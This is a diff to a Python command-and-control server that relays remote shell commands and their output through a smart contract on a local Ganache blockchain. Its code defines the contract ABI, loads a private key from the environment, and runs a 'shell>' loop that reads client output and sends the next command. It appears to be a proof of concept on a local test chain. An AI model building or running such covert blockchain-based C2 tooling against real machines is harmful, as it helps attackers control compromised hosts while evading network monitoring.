@@ -13,6 +13,14 @@ from dotenv import load_dotenv
 
 # Constants.
 SOLIDITY_VERSION = "0.6.0"
+ASCII_ART = '''
+   ___     ___     ___     ___   
+  | _ \   | _ )   / __|   / __|  
+  |   /   | _ \  | (__    \__ \  
+  |_|_\   |___/   \___|   |___/  
+_|"""""|_|"""""|_|"""""|_|"""""| 
+"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 
+'''
 CONTRACT_ABI = [
     {"inputs": [], "stateMutability": "nonpayable", "type": "constructor"},
     {
@@ -58,6 +66,13 @@ CONTRACT_ABI = [
         "type": "function",
     },
     {
+        "inputs": [],
+        "name": "ResetOutput",
+        "outputs": [],
+        "stateMutability": "nonpayable",
+        "type": "function",
+    },
+    {
         "inputs": [{"internalType": "string", "name": "command_", "type": "string"}],
         "name": "SetCommand",
         "outputs": [],
@@ -80,25 +95,17 @@ CONTRACT_ABI = [
         "stateMutability": "nonpayable",
         "type": "function",
     },
-    {
-        "inputs": [
-            {"internalType": "uint256", "name": "isOutputReady_", "type": "uint256"}
-        ],
-        "name": "SetisOutputReady",
-        "outputs": [],
-        "stateMutability": "nonpayable",
-        "type": "function",
-    },
 ]
 GANACHE_SERVICE = "HTTP://127.0.0.1:7545"
 CHAIN_ID = 1337
-ACCOUNT0_ADDR = "0x786686a989F14A9a0028e4e96eEBd1BD7f5c26f2"
-CONTRACT_ADDR = "0x97223459512580e95fC25051e52e064667394Daf"
+CONTRACT_ADDR = "0xb2e9d407c4f8534e80c6a713094633DC57FCA2D4"
+ACCOUNT0_ADDR = "0x2F36BDBf0d97819A4B02f3534446659Ed884Fc4e"
 load_dotenv()  # Import enviorment variables.
 PRIVATE_KEY0 = os.getenv("PRIVATE_KEY0")
 
 # Main
 def main():
+    print(ASCII_ART)
     command = ""
 
     # Reset the blockchain (in case there was a previous execution of the program).
@@ -116,14 +123,13 @@ def main():
 
         # Wait for a connection to the client\wait for the client to send command output.
         while not CnC_Contract.functions.GetisOutputReady().call():
-            time.sleep(1)
+            time.sleep(0.1)
 
         # Get command output.
-        command = input(CnC_Contract.functions.GetOutput().call())
+        command = input(f"{CnC_Contract.functions.GetOutput().call()}\nshell>")
 
         # Reset output variable and set isOutputReady to false.
-        SetOutput("")
-        SetisOutputReady(0)
+        ResetOutput()
 
         # Send command and set isCommandReady to true.
         SendCommand(command)
@@ -147,10 +153,10 @@ def ResetBlockChain():
 
 
 # SetOutput() executes a transaction to set output variable.
-def SetOutput(output):
+def ResetOutput():
     return RunTransaction(
-        "SetOutput",
-        [output],
+        "ResetOutput",
+        [],
     )
 
 
